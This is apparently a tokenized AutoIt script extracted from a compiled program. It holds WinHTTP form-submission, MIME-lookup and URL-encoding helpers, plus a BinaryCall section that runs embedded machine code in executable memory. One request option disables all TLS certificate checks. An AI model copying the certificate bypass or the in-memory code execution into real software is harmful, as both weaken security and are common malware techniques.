32__WINHTTPFILECONTENT($SACCEPT,$SNAME,$SFILESTRING,$SBOUNDARYMAIN="")
28$FNONSTANDARD=40
4322($SFILESTRING,10)="PHP#50338:"5
$SFILESTRING=336($SFILESTRING,10)
$FNONSTANDARD=39
8
28$SOUT='Content-Disposition: form-data; name="'&$SNAME&'"'
43$SFILESTRING534$SOUT&'; filename=""'&@CRLF&@CRLF&@CRLF
4330($SFILESTRING,1)="|"5$SFILESTRING=337($SFILESTRING,1)
28$AFILES=331($SFILESTRING,"|",2),$HFILE
4369($AFILES)=15
$HFILE=110($AFILES[0],16)
$SOUT&='; filename="'&327($AFILES[0],".*\\","")&'"'&@CRLF&"Content-Type: "&__WINHTTPMIMETYPE($AFILES[0])&@CRLF&@CRLF&16(112($HFILE),1)&@CRLF
90($HFILE)
34$SOUT
8
4$FNONSTANDARD5
$SOUT=""
28$IFILES=369($AFILES)
13$I=015$IFILES-1
$HFILE=110($AFILES[$I],16)
$SOUT&='Content-Disposition: form-data; name="'&$SNAME&'"'&'; filename="'&327($AFILES[$I],".*\\","")&'"'&@CRLF&"Content-Type: "&__WINHTTPMIMETYPE($AFILES[$I])&@CRLF&@CRLF&16(112($HFILE),1)&@CRLF
90($HFILE)
4$I<$IFILES-15$SOUT&="--"&$SBOUNDARYMAIN&@CRLF
14
6
28$SBOUNDARY=309("%s%.5f","----WinHttpSubBoundaryLine_",274(10000,99999))
$SOUT&=@CRLF&"Content-Type: multipart/mixed; boundary="&$SBOUNDARY&@CRLF&@CRLF
13$I=015369($AFILES)-1
$HFILE=110($AFILES[$I],16)
$SOUT&="--"&$SBOUNDARY&@CRLF&'Content-Disposition: file; filename="'&327($AFILES[$I],".*\\","")&'"'&@CRLF&"Content-Type: "&__WINHTTPMIMETYPE($AFILES[$I])&@CRLF&@CRLF&16(112($HFILE),1)&@CRLF
90($HFILE)
14
$SOUT&="--"&$SBOUNDARY&"--"&@CRLF
8
34$SOUT
33
32__WINHTTPMIMETYPE($SFILENAME)
28$AARRAY=326(__WINHTTPMIMEASSOCSTRING(),"(?i)\Q;"&327($SFILENAME,".*\.","")&"\E\|(.*?);",3)
4@ERROR534"application/octet-stream"
34$AARRAY[0]
33
32__WINHTTPMIMEASSOCSTRING()
28$LONGSHIT=";ai|application/postscript;aif|audio/x-aiff;aifc|audio/x-aiff;aiff|audio/x-aiff;asc|text/plain;atom|application/atom+xml;au|audio/basic;avi|video/x-msvideo;bcpio|application/x-bcpio;bin|application/octet-stream;bmp|image/bmp;cdf|application/x-netcdf;cgm|image/cgm;class|application/octet-stream;cpio|application/x-cpio;cpt|application/mac-compactpro;csh|application/x-csh;css|text/css;dcr|application/x-director;dif|video/x-dv;dir|application/x-director;djv|image/vnd.djvu;djvu|image/vnd.djvu;dll|application/octet-stream;dmg|application/octet-stream;dms|application/octet-stream;doc|application/msword;dtd|application/xml-dtd;dv|video/x-dv;dvi|application/x-dvi;dxr|application/x-director;eps|application/postscript;etx|text/x-setext;exe|application/octet-stream;ez|application/andrew-inset;gif|image/gif;gram|application/srgs;grxml|application/srgs+xml;gtar|application/x-gtar;hdf|application/x-hdf;hqx|application/mac-binhex40;htm|text/html;html|text/html;ice|x-conference/x-cooltalk;ico|image/x-icon;ics|text/calendar;ief|image/ief;ifb|text/calendar;iges|model/iges;igs|model/iges;jnlp|application/x-java-jnlp-file;jp2|image/jp2;jpe|image/jpeg;jpeg|image/jpeg;jpg|image/jpeg;js|application/x-javascript;kar|audio/midi;latex|application/x-latex;lha|application/octet-stream;lzh|application/octet-stream;m3u|audio/x-mpegurl;m4a|audio/mp4a-latm;m4b|audio/mp4a-latm;m4p|audio/mp4a-latm;m4u|video/vnd.mpegurl;m4v|video/x-m4v;mac|image/x-macpaint;man|application/x-troff-man;mathml|application/mathml+xml;me|application/x-troff-me;mesh|model/mesh;mid|audio/midi;midi|audio/midi;mif|application/vnd.mif;mov|video/quicktime;movie|video/x-sgi-movie;mp2|audio/mpeg;mp3|audio/mpeg;mp4|video/mp4;mpe|video/mpeg;mpeg|video/mpeg;mpg|video/mpeg;mpga|audio/mpeg;ms|application/x-troff-ms;msh|model/mesh;mxu|video/vnd.mpegurl;nc|applica"
$LONGSHIT&="tion/x-netcdf;oda|application/oda;ogg|application/ogg;pbm|image/x-portable-bitmap;pct|image/pict;pdb|chemical/x-pdb;pdf|application/pdf;pgm|image/x-portable-graymap;pgn|application/x-chess-pgn;pic|image/pict;pict|image/pict;png|image/png;pnm|image/x-portable-anymap;pnt|image/x-macpaint;pntg|image/x-macpaint;ppm|image/x-portable-pixmap;ppt|application/vnd.ms-powerpoint;ps|application/postscript;qt|video/quicktime;qti|image/x-quicktime;qtif|image/x-quicktime;ra|audio/x-pn-realaudio;ram|audio/x-pn-realaudio;ras|image/x-cmu-raster;rdf|application/rdf+xml;rgb|image/x-rgb;rm|application/vnd.rn-realmedia;roff|application/x-troff;rtf|text/rtf;rtx|text/richtext;sgm|text/sgml;sgml|text/sgml;sh|application/x-sh;shar|application/x-shar;silo|model/mesh;sit|application/x-stuffit;skd|application/x-koan;skm|application/x-koan;skp|application/x-koan;skt|application/x-koan;smi|application/smil;smil|application/smil;snd|audio/basic;so|application/octet-stream;spl|application/x-futuresplash;src|application/x-wais-source;sv4cpio|application/x-sv4cpio;sv4crc|application/x-sv4crc;svg|image/svg+xml;swf|application/x-shockwave-flash;t|application/x-troff;tar|application/x-tar;tcl|application/x-tcl;tex|application/x-tex;texi|application/x-texinfo;texinfo|application/x-texinfo;tif|image/tiff;tiff|image/tiff;tr|application/x-troff;tsv|text/tab-separated-values;txt|text/plain;ustar|application/x-ustar;vcd|application/x-cdlink;vrml|model/vrml;vxml|application/voicexml+xml;wav|audio/x-wav;wbmp|image/vnd.wap.wbmp;wbmxl|application/vnd.wap.wbxml;wml|text/vnd.wap.wml;wmlc|application/vnd.wap.wmlc;wmls|text/vnd.wap.wmlscript;wmlsc|application/vnd.wap.wmlscriptc;wrl|model/vrml;xbm|image/x-xbitmap;xht|application/xhtml+xml;xhtml|application/xhtml+xml;xls|application/vnd.ms-excel;xml|application/xml;xpm|image/x-xpixmap;xsl|application/xml;xslt|application/xslt+xml;xul|application/vnd.mozilla.xul+xml;xwd|image/x-xwindowdump;xyz|chemical/x-xyz;zip|application/zip;"
34$LONGSHIT
33
32__WINHTTPCHARSET($SCONTENTTYPE)
28$ACONTENTTYPE=326($SCONTENTTYPE,"(?i).*?\Qcharset=\E(?U)([^ ]+)(;| |\Z)",2)
43@ERROR5$SCONTENTTYPE=$ACONTENTTYPE[1]
4322($SCONTENTTYPE,2)="cp"534217(336($SCONTENTTYPE,2))
4$SCONTENTTYPE="utf-8"53465001
33
32__WINHTTPURLENCODE($VDATA,$SENCTYPE="")
4221($VDATA)534$VDATA
$VDATA=__WINHTTPHTMLDECODE($VDATA)
4$SENCTYPE="text/plain"534328($VDATA," ","+")
28$ADATA=334($VDATA,41,41,2)
28$SOUT
13$I=015369($ADATA)-1
23$ADATA[$I]
2145,46,481557,651590,95,9715122,126
$SOUT&=28($ADATA[$I])
2132
$SOUT&="+"
216
$SOUT&="%"&199($ADATA[$I],2)
24
14
34$SOUT
33
32__WINHTTPHTMLDECODE($VDATA)
34328(328(328(328($VDATA,"&amp;","&"),"&lt;","<"),"&gt;",">"),"&quot;",'"')
33
32__WINHTTPNORMALIZEACTIONURL($SACTIONPAGE,36$SACTION,36$ISCHEME,36$SNEWURL,36$SENCTYPE,36$SMETHOD,$SURL="")
28$ACRACKURL=_WINHTTPCRACKURL($SACTION)
4@ERROR5
4$SACTION5
4322($SACTION,2)="//"5
$ACRACKURL=_WINHTTPCRACKURL($SURL)
43@ERROR5
$ACRACKURL=_WINHTTPCRACKURL($ACRACKURL[0]&":"&$SACTION)
43@ERROR5
$SNEWURL=$ACRACKURL[0]&"://"&$ACRACKURL[2]&":"&$ACRACKURL[3]
$ISCHEME=$ACRACKURL[1]
$SACTION=$ACRACKURL[6]&$ACRACKURL[7]
$SACTIONPAGE=""
8
8
7322($SACTION,1)="?"5
$ACRACKURL=_WINHTTPCRACKURL($SURL)
$SACTION=$ACRACKURL[6]&$SACTION
7322($SACTION,1)="#"5
$SACTION=328($SACTIONPAGE,327($SACTIONPAGE,"(.*?)(#.*?)","$2"),$SACTION)
7322($SACTION,1)<>"/"5
28$SCURRENT
28$AURL=326($SACTIONPAGE,"(.*)/",3)
43@ERROR5$SCURRENT=$AURL[0]
4$SCURRENT5$SACTION=$SCURRENT&"/"&$SACTION
8
4322($SACTION,1)="?"5$SACTION=$SACTIONPAGE&$SACTION
8
43$SACTION5$SACTION=$SACTIONPAGE
$SACTION=327($SACTION,"\A(/*\.\./)*","")
6
$ISCHEME=$ACRACKURL[1]
$SNEWURL=$ACRACKURL[0]&"://"&$ACRACKURL[2]&":"&$ACRACKURL[3]
$SACTION=$ACRACKURL[6]&$ACRACKURL[7]
8
43$SMETHOD5$SMETHOD="GET"
4$SMETHOD="GET"5$SENCTYPE=""
33
32__WINHTTPHTML5FORMATTRIBS(36$ADTAS,36$AFLDS,36$INUMPARAMS,36$AINPUT,36$SACTION,36$SENCTYPE,36$SMETHOD)
28$ASPL,$ISUBMITHTML5=0,$IINPSUBM,$SIMGAPPX="."
13$K=115$INUMPARAMS
$ASPL=331($AFLDS[$K],":",2)
4$ASPL[0]="type"1($ASPL[1]="submit"2$ASPL[1]="image")5
28$ISUBMINDEX=$ADTAS[$K],$ISUBMCUR=0,$IIMGCUR=0,$STYPE,$SINPNME
4$ASPL[1]="image"5
$ISUBMINDEX=217($ADTAS[$K])
8
13$I=015369($AINPUT)-1
23__WINHTTPATTRIBVAL($AINPUT[$I],"type")
21"submit"
4$ISUBMCUR=$ISUBMINDEX5
$ISUBMITHTML5=1
$IINPSUBM=$I
182
8
$ISUBMCUR+=1
21"image"
4$IIMGCUR=$ISUBMINDEX5
$ISUBMITHTML5=1
$IINPSUBM=$I
$SINPNME=__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"name")
4$SINPNME5$SINPNME&=$SIMGAPPX
$AINPUT[$IINPSUBM]='type="image" formaction="'&__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formaction")&'" formenctype="'&__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formenctype")&'" formmethod="'&__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formmethod")&'"'
28$SX=0,$SY=0
$IX=217(327($ADTAS[$K],"(\d+)\h*(\d+),(\d+)","$2",1))
$IY=217(327($ADTAS[$K],"(\d+)\h*(\d+),(\d+)","$3",1))
27$AINPUT[369($AINPUT)+2]
$AINPUT[369($AINPUT)-2]='type="image" name="'&$SINPNME&'x" value="'&$IX&'"'
$AINPUT[369($AINPUT)-1]='type="image" name="'&$SINPNME&'y" value="'&$IY&'"'
182
8
$IIMGCUR+=1
24
14
7$ASPL[0]="name"5
28$SINPNME=$ASPL[1],$STYPE
13$I=015369($AINPUT)-1
$STYPE=__WINHTTPATTRIBVAL($AINPUT[$I],"type")
4$STYPE="submit"5
4__WINHTTPATTRIBVAL($AINPUT[$I],"name")=$SINPNME1$ADTAS[$K]=395
$ISUBMITHTML5=1
$IINPSUBM=$I
182
8
7$STYPE="image"5
4__WINHTTPATTRIBVAL($AINPUT[$I],"name")=$SINPNME1$ADTAS[$K]5
$ISUBMITHTML5=1
$IINPSUBM=$I
28$ASTRSPLIT=331($ADTAS[$K],",",3),$IX=0,$IY=0
43@ERROR5
$IX=217($ASTRSPLIT[0])
$IY=217($ASTRSPLIT[1])
8
$AINPUT[$IINPSUBM]='type="image" formaction="'&__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formaction")&'" formenctype="'&__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formenctype")&'" formmethod="'&__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formmethod")&'"'
$SINPNME&=$SIMGAPPX
27$AINPUT[369($AINPUT)+2]
$AINPUT[369($AINPUT)-2]='type="image" name="'&$SINPNME&'x" value="'&$IX&'"'
$AINPUT[369($AINPUT)-1]='type="image" name="'&$SINPNME&'y" value="'&$IY&'"'
182
8
8
14
6
28$SINPID,$STYPE
4@ERROR5
$SINPID=$ASPL[0]
7$ASPL[0]="id"5
$SINPID=$ASPL[1]
8
13$I=015369($AINPUT)-1
$STYPE=__WINHTTPATTRIBVAL($AINPUT[$I],"type")
4$STYPE="submit"5
4__WINHTTPATTRIBVAL($AINPUT[$I],"id")=$SINPID1$ADTAS[$K]=395
$ISUBMITHTML5=1
$IINPSUBM=$I
182
8
7$STYPE="image"5
4__WINHTTPATTRIBVAL($AINPUT[$I],"id")=$SINPID1$ADTAS[$K]5
$ISUBMITHTML5=1
$IINPSUBM=$I
28$SINPNME=__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"name")
4$SINPNME5$SINPNME&=$SIMGAPPX
28$ASTRSPLIT=331($ADTAS[$K],",",3),$IX=0,$IY=0
43@ERROR5
$IX=217($ASTRSPLIT[0])
$IY=217($ASTRSPLIT[1])
8
$AINPUT[$IINPSUBM]='type="image" formaction="'&__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formaction")&'" formenctype="'&__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formenctype")&'" formmethod="'&__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formmethod")&'"'
27$AINPUT[369($AINPUT)+2]
$AINPUT[369($AINPUT)-2]='type="image" name="'&$SINPNME&'x" value="'&$IX&'"'
$AINPUT[369($AINPUT)-1]='type="image" name="'&$SINPNME&'y" value="'&$IY&'"'
182
8
8
14
8
14
4$ISUBMITHTML55
28$IUBOUND=369($AINPUT)-1
4__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"type")="image"5$IUBOUND-=2
13$J=015$IUBOUND
4$J=$IINPSUBM519
23__WINHTTPATTRIBVAL($AINPUT[$J],"type")
21"submit","image"
$AINPUT[$J]=""
24
14
28$SATTR=__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formaction")
4$SATTR5$SACTION=$SATTR
$SATTR=__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formenctype")
4$SATTR5$SENCTYPE=$SATTR
$SATTR=__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"formmethod")
4$SATTR5$SMETHOD=$SATTR
4__WINHTTPATTRIBVAL($AINPUT[$IINPSUBM],"type")="image"5$AINPUT[$IINPSUBM]=""
8
33
32__WINHTTPNORMALIZEFORM(36$SFORM,$SSPR1,$SSPR2)
28$ADATA=334($SFORM,41,41,2)
28$SOUT,$BQUOT=40,$BSQUOT=40
13$I=015369($ADATA)-1
23$ADATA[$I]
2134
$BQUOT=3$BQUOT
2139
$BSQUOT=3$BSQUOT
2132
4$BQUOT2$BSQUOT5
$SOUT&=$SSPR1
6
$SOUT&=28($ADATA[$I])
8
2162
4$BQUOT2$BSQUOT5
$SOUT&=$SSPR2
6
$SOUT&=28($ADATA[$I])
8
216
$SOUT&=28($ADATA[$I])
24
14
$SFORM=$SOUT
33
32__WINHTTPFINALIZECTRLS($SSUBMIT,$SRADIO,$SCHECKBOX,$SBUTTON,36$SADDDATA,$SGRSEP,$SBOUND="")
4$SSUBMIT5
28$ASUBMIT=331($SSUBMIT,$SGRSEP,3)
13$M=115369($ASUBMIT)-1
$SADDDATA=327($SADDDATA,"(?:\Q"&$SBOUND&"\E|\A)\Q"&$ASUBMIT[$M]&"\E(?:\Q"&$SBOUND&"\E|\z)",$SBOUND)
14
__WINHTTPTRIMBOUNDS($SADDDATA,$SBOUND)
8
4$SRADIO5
4$SRADIO<>$SGRSEP5
13$SELEM17331($SRADIO,$SGRSEP,3)
$SADDDATA=327($SADDDATA,"(?:\Q"&$SBOUND&"\E|\A)\Q"&$SELEM&"\E(?:\Q"&$SBOUND&"\E|\z)",$SBOUND)
14
__WINHTTPTRIMBOUNDS($SADDDATA,$SBOUND)
8
8
4$SCHECKBOX5
13$SELEM17331($SCHECKBOX,$SGRSEP,3)
$SADDDATA=327($SADDDATA,"(?:\Q"&$SBOUND&"\E|\A)\Q"&$SELEM&"\E(?:\Q"&$SBOUND&"\E|\z)",$SBOUND)
14
__WINHTTPTRIMBOUNDS($SADDDATA,$SBOUND)
8
4$SBUTTON5
13$SELEM17331($SBUTTON,$SGRSEP,3)
$SADDDATA=327($SADDDATA,"(?:\Q"&$SBOUND&"\E|\A)\Q"&$SELEM&"\E(?:\Q"&$SBOUND&"\E|\z)",$SBOUND)
14
__WINHTTPTRIMBOUNDS($SADDDATA,$SBOUND)
8
33
32__WINHTTPTRIMBOUNDS(36$SDTA,$SBOUND)
28$IBLEN=323($SBOUND)
4330($SDTA,$IBLEN)=$SBOUND5$SDTA=337($SDTA,$IBLEN)
4322($SDTA,$IBLEN)=$SBOUND5$SDTA=336($SDTA,$IBLEN)
33
32__WINHTTPFORMATTRIB(36$AATTRIB,$I,$SELEMENT)
$AATTRIB[0][$I]=__WINHTTPATTRIBVAL($SELEMENT,"id")
$AATTRIB[1][$I]=__WINHTTPATTRIBVAL($SELEMENT,"name")
$AATTRIB[2][$I]=__WINHTTPATTRIBVAL($SELEMENT,"value")
$AATTRIB[3][$I]=__WINHTTPATTRIBVAL($SELEMENT,"type")
33
32__WINHTTPATTRIBVAL($SIN,$SATTRIB)
28$AARRAY=326($SIN,"(?i).*?(\A| )\b"&$SATTRIB&'\h*=(\h*"(.*?)"|'&"\h*'(.*?)'|"&"\h*(.*?)(?: |\Z))",1)
4@ERROR534""
34$AARRAY[369($AARRAY)-1]
33
32__WINHTTPFORMSEND($HINTERNET,$SMETHOD,$SACTION,$FMULTIPART,$SBOUNDARY,$SADDDATA,$FSECURE=40,$SADDITIONALHEADERS="",$SCREDNAME="",$SCREDPASS="",$IIGNOREALLCERTERRORS=0)
28$HREQUEST
4$FSECURE5
$HREQUEST=_WINHTTPOPENREQUEST($HINTERNET,$SMETHOD,$SACTION,41,41,41,$WINHTTP_FLAG_SECURE)
4$IIGNOREALLCERTERRORS5_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_SECURITY_FLAGS,19($SECURITY_FLAG_IGNORE_UNKNOWN_CA,$SECURITY_FLAG_IGNORE_CERT_DATE_INVALID,$SECURITY_FLAG_IGNORE_CERT_CN_INVALID,$SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE))
6
$HREQUEST=_WINHTTPOPENREQUEST($HINTERNET,$SMETHOD,$SACTION)
8
4$FMULTIPART5
_WINHTTPADDREQUESTHEADERS($HREQUEST,"Content-Type: multipart/form-data; boundary="&$SBOUNDARY)
6
4$SMETHOD="POST"5_WINHTTPADDREQUESTHEADERS($HREQUEST,"Content-Type: application/x-www-form-urlencoded")
8
_WINHTTPADDREQUESTHEADERS($HREQUEST,"Accept: application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5")
_WINHTTPADDREQUESTHEADERS($HREQUEST,"Accept-Charset: utf-8;q=0.7")
4$SADDITIONALHEADERS5_WINHTTPADDREQUESTHEADERS($HREQUEST,$SADDITIONALHEADERS,19($WINHTTP_ADDREQ_FLAG_REPLACE,$WINHTTP_ADDREQ_FLAG_ADD))
_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_DECOMPRESSION,$WINHTTP_DECOMPRESSION_FLAG_ALL)
_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_UNSAFE_HEADER_PARSING,1)
__WINHTTPFORMUPLOAD($HREQUEST,"",$SADDDATA)
_WINHTTPRECEIVERESPONSE($HREQUEST)
__WINHTTPSETCREDENTIALS($HREQUEST,"",$SADDDATA,$SCREDNAME,$SCREDPASS,1)
34$HREQUEST
33
32__WINHTTPSETCREDENTIALS($HREQUEST,$SHEADERS="",$SOPTIONAL="",$SCREDNAME="",$SCREDPASS="",$IFORMFILL=0)
4$SCREDNAME1$SCREDPASS5
28$ISTATUSCODE=_WINHTTPQUERYHEADERS($HREQUEST,$WINHTTP_QUERY_STATUS_CODE)
4$ISTATUSCODE=$HTTP_STATUS_DENIED2$ISTATUSCODE=$HTTP_STATUS_PROXY_AUTH_REQ5
28$ISUPPORTEDSCHEMES,$IFIRSTSCHEME,$IAUTHTARGET
4_WINHTTPQUERYAUTHSCHEMES($HREQUEST,$ISUPPORTEDSCHEMES,$IFIRSTSCHEME,$IAUTHTARGET)5
4$IFIRSTSCHEME=$WINHTTP_AUTH_SCHEME_PASSPORT1$ISTATUSCODE=$HTTP_STATUS_PROXY_AUTH_REQ5
_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_CONFIGURE_PASSPORT_AUTH,$WINHTTP_ENABLE_PASSPORT_AUTH)
_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_PROXY_USERNAME,$SCREDNAME)
_WINHTTPSETOPTION($HREQUEST,$WINHTTP_OPTION_PROXY_PASSWORD,$SCREDPASS)
6
_WINHTTPSETCREDENTIALS($HREQUEST,$IAUTHTARGET,$IFIRSTSCHEME,$SCREDNAME,$SCREDPASS)
8
4$IFORMFILL5
__WINHTTPFORMUPLOAD($HREQUEST,$SHEADERS,$SOPTIONAL)
6
_WINHTTPSENDREQUEST($HREQUEST,$SHEADERS,$SOPTIONAL)
8
_WINHTTPRECEIVERESPONSE($HREQUEST)
8
8
8
33
32__WINHTTPFORMUPLOAD($HREQUEST,$SHEADERS,$SDATA)
28$ACLBK=_WINHTTPSIMPLEFORMFILL_SETUPLOADCALLBACK()
4$ACLBK[0]<>415
28$ISIZE=323($SDATA),$ICHUNK=125($ISIZE/$ACLBK[1]),$IREST=$ISIZE-($ACLBK[1]-1)*$ICHUNK,$ICURCH=$ICHUNK
_WINHTTPSENDREQUEST($HREQUEST,41,41,$ISIZE)
13$I=115$ACLBK[1]
4$I=$ACLBK[1]5$ICURCH=$IREST
_WINHTTPWRITEDATA($HREQUEST,325($SDATA,1+$ICHUNK*($I-1),$ICURCH))
25($ACLBK[0],125($I*100/$ACLBK[1]))
14
6
_WINHTTPSENDREQUEST($HREQUEST,41,$SDATA)
8
33
32__WINHTTPDEFAULT(36$VINPUT,$VOUTPUT)
4$VINPUT=412250($VINPUT)=-15$VINPUT=$VOUTPUT
33
32__WINHTTPMEMGLOBALFREE($PMEM)
28$ACALL=58("kernel32.dll","ptr","GlobalFree","ptr",$PMEM)
4@ERROR2$ACALL[0]534287(1,0,0)
341
33
32__WINHTTPPTRSTRINGLENW($PSTR)
28$ACALL=58("kernel32.dll","dword","lstrlenW","ptr",$PSTR)
4@ERROR534287(1,0,0)
34$ACALL[0]
33
32__WINHTTPUA()
2831$SUA="Mozilla/5.0 "&__WINHTTPSYSINFO()&" WinHttp/"&__WINHTTPVER()&" (WinHTTP/5.1) like Gecko"
34$SUA
33
32__WINHTTPSYSINFO()
28$SDTA=107("kernel32.dll")
$SDTA="(Windows NT "&322($SDTA,311($SDTA,".",1,2)-1)
4311(@OSARCH,"64")13@AUTOITX645$SDTA&="; WOW64"
$SDTA&=")"
34$SDTA
33
32__WINHTTPVER()
34"1.6.4.0"
33
32_WINHTTPBINARYCONCAT(36$BBINARY1,36$BBINARY2)
28$BOUT=_WINHTTPSIMPLEBINARYCONCAT($BBINARY1,$BBINARY2)
34287(@ERROR,0,$BOUT)
33
29$__BINARYCALL_KERNEL32DLL=64("kernel32.dll")
29$__BINARYCALL_MSVCRTDLL=64("msvcrt.dll")
29$__BINARYCALL_LASTERROR=""
32_BINARYCALL_GETPROCADDRESS($MODULE,$PROC)
28$RET=58($__BINARYCALL_KERNEL32DLL,"ptr","GetProcAddress","ptr",$MODULE,"str",$PROC)
4@ERROR23$RET[0]534287(1,@ERROR,0)
34$RET[0]
33
32_BINARYCALL_LOADLIBRARY($FILENAME)
28$RET=58($__BINARYCALL_KERNEL32DLL,"handle","LoadLibraryW","wstr",$FILENAME)
4@ERROR534287(1,@ERROR,0)
34$RET[0]
33
32_BINARYCALL_LSTRLENA($PTR)
28$RET=58($__BINARYCALL_KERNEL32DLL,"int","lstrlenA","ptr",$PTR)
4@ERROR534287(1,@ERROR,0)
34$RET[0]
33
32_BINARYCALL_ALLOC($CODE,$PADDING=0)
28$LENGTH=14($CODE)+$PADDING
28$RET=58($__BINARYCALL_KERNEL32DLL,"ptr","VirtualAlloc","ptr",0,"ulong_ptr",$LENGTH,"dword",4096,"dword",64)
4@ERROR23$RET[0]534287(1,@ERROR,0)
414($CODE)5
28$BUFFER=65("byte["&$LENGTH&"]",$RET[0])
69($BUFFER,1,$CODE)
8
34$RET[0]
33
32_BINARYCALL_REGIONSIZE($PTR)
28$BUFFER=65("ptr;ptr;dword;uint_ptr;dword;dword;dword")
28$RET=58($__BINARYCALL_KERNEL32DLL,"int","VirtualQuery","ptr",$PTR,"ptr",67($BUFFER),"uint_ptr",68($BUFFER))
4@ERROR2$RET[0]=0534287(1,@ERROR,0)
3466($BUFFER,4)
33
32_BINARYCALL_FREE($PTR)
28$RET=58($__BINARYCALL_KERNEL32DLL,"bool","VirtualFree","ptr",$PTR,"ulong_ptr",0,"dword",32768)
4@ERROR2$RET[0]=05
$RET=58($__BINARYCALL_KERNEL32DLL,"bool","GlobalFree","ptr",$PTR)
4@ERROR2$RET[0]<>0534287(1,@ERROR,40)
8
3439
33
32_BINARYCALL_RELEASE($CODEBASE)
28$RET=_BINARYCALL_FREE($CODEBASE)
34287(@ERROR,@EXTENDED,$RET)
33
32_BINARYCALL_MEMORYSEARCH($PTR,$LENGTH,$BINARY)
31$CODEBASE
43$CODEBASE5
4@AUTOITX645
$CODEBASE=_BINARYCALL_CREATE("0x4883EC084D85C94889C8742C4C39CA72254C29CA488D141131C9EB0848FFC14C39C97414448A1408453A140874EE48FFC04839D076E231C05AC3","",0,39,40)
6
$CODEBASE=_BINARYCALL_CREATE("0x5589E58B4D14578B4508568B550C538B7D1085C9742139CA721B29CA8D341031D2EB054239CA740F8A1C17381C1074F34039F076EA31C05B5E5F5DC3","",0,39,40)
8
43$CODEBASE534287(1,0,0)
8
$BINARY=13($BINARY)
28$BUFFER=65("byte["&14($BINARY)&"]")
69($BUFFER,1,$BINARY)
28$RET=59("ptr:cdecl",$CODEBASE,"ptr",$PTR,"uint",$LENGTH,"ptr",67($BUFFER),"uint",68($BUFFER))
34$RET[0]
33
32_BINARYCALL_BASE64DECODE($SRC)
31$CODEBASE
43$CODEBASE5
4@AUTOITX645
$CODEBASE=_BINARYCALL_CREATE("0x41544989CAB9FF000000555756E8BE000000534881EC000100004889E7F3A44C89D6E98A0000004439C87E0731C0E98D0000000FB66E01440FB626FFC00FB65E020FB62C2C460FB62424408A3C1C0FB65E034189EB41C1E4024183E3308A1C1C41C1FB044509E34080FF634189CC45881C08744C440FB6DFC1E5044489DF4088E883E73CC1FF0209C7418D44240241887C08014883C10380FB63742488D841C1E3064883C60483E03F4409D841884408FF89F389C84429D339D30F8C67FFFFFF4881C4000100005B5E5F5D415CC35EC3E8F9FFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000003E0000003F3435363738393A3B3C3D00000063000000000102030405060708090A0B0C0D0E0F101112131415161718190000000000001A1B1C1D1E1F202122232425262728292A2B2C2D2E2F30313233","",132,39,40)
6
$CODEBASE=_BINARYCALL_CREATE("0x55B9FF00000089E531C05756E8F10000005381EC0C0100008B55088DBDF5FEFFFFF3A4E9C00000003B45140F8FC20000000FB65C0A028A9C1DF5FEFFFF889DF3FEFFFF0FB65C0A038A9C1DF5FEFFFF889DF2FEFFFF0FB65C0A018985E8FEFFFF0FB69C1DF5FEFFFF899DECFEFFFF0FB63C0A89DE83E630C1FE040FB6BC3DF5FEFFFFC1E70209FE8B7D1089F3881C074080BDF3FEFFFF63745C0FB6B5F3FEFFFF8BBDECFEFFFF8B9DE8FEFFFF89F083E03CC1E704C1F80209F88B7D1088441F0189D883C00280BDF2FEFFFF6374278A85F2FEFFFFC1E60683C10483E03F09F088441F0289D883C0033B4D0C0F8C37FFFFFFEB0231C081C40C0100005B5E5F5DC35EC3E8F9FFFFFF000000000000000000000000000000000000000000000000000000000000000000000000000000000000003E0000003F3435363738393A3B3C3D00000063000000000102030405060708090A0B0C0D0E0F101112131415161718190000000000001A1B1C1D1E1F202122232425262728292A2B2C2D2E2F30313233","",132,39,40)
8
43$CODEBASE534287(1,0,13(""))
8
$SRC=306($SRC)
28$SRCLEN=323($SRC)
28$SRCBUF=65("char["&$SRCLEN&"]")
69($SRCBUF,1,$SRC)
28$DSTLEN=217(($SRCLEN+2)/4)*3+1
28$DSTBUF=65("byte["&$DSTLEN&"]")
28$RET=59("uint:cdecl",$CODEBASE,"ptr",67($SRCBUF),"uint",$SRCLEN,"ptr",67($DSTBUF),"uint",$DSTLEN)
4$RET[0]=0534287(2,0,13(""))
3415(66($DSTBUF,1),1,$RET[0])
33
32_BINARYCALL_BASE64ENCODE($SRC)
31$CODEBASE
43$CODEBASE5
4@AUTOITX645
